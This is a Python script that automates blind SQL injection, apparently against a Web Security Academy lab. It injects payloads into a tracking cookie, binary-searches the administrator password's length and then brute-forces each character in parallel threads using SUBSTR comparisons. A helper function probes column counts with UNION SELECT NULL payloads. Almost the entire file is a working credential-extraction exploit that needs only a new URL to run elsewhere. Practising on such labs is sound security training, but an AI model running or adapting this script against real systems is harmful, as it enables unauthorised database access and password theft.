# non-oracle dbms
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
session.verify = False
print = console.print

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "' UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "

        response: r.Response = session.get(URL + quote(PAYLOAD.strip(", ") + " --"))

        if response.status_code == 200:
            break

        count += 1

    return count


def main() -> None:
    URL = "https://0a1a007b048378538044b29c00c0005c.web-security-academy.net/filter?category=Pets"

    response: r.Response = r.get(URL)
    print("Welcome back!" in response.text)

    dct = dict(response.cookies.items())

    tracking_id = dct["TrackingId"]
    session = dct["session"]

    print(tracking_id)

    response = r.get(URL, cookies={"TrackingId": tracking_id, "session": session})
    print("Welcome back!" in response.text)

    password = ""
    length = 0

    # Find length of password
    _high = 40
    _low = 0
    while _low < _high:
        mid = (_low + _high) // 2
        print(f"Trying number {mid}...")

        response = r.get(
            URL,
            cookies={
                "TrackingId": tracking_id
                + f"' AND (SELECT 'A' FROM users WHERE username = 'administrator' AND LENGTH(password) > {mid}) = 'A' --",
                "session": session,
            },
        )
        if "Welcome back!" in response.text:
            _low = mid + 1
        else:
            _high = mid

    length = _low
    print(f"The password length is {length}")

    def find_char(idx, dct):
        stop_event = Event()

        def check_char(ch):
            if stop_event.is_set():
                return ch, False

            response = r.get(
                URL,
                cookies={
                    "TrackingId": tracking_id
                    + f"' AND (SELECT SUBSTR(password, {idx}, 1) FROM users WHERE username = 'administrator') = '{ch}' --",
                    "session": session,
                },
            )
            if "Welcome back!" in response.text:
                stop_event.set()
                dct[idx] = ch
                print(f"{ch}: True")

                return ch, True

            return ch, False

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_char, ch) for ch in charset]
            for future in as_completed(futures):
                if stop_event.is_set():
                    for f in futures:
                        f.cancel()  # Only cancels tasks that haven't started
                    break

    dct = {}

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(find_char, idx, dct) for idx in range(1, length + 1)]
        for future in as_completed(futures):
            ...

    print("".join(dict(sorted(dct.items(), key=lambda item: item[0])).values()))


if __name__ == "__main__":
    main()
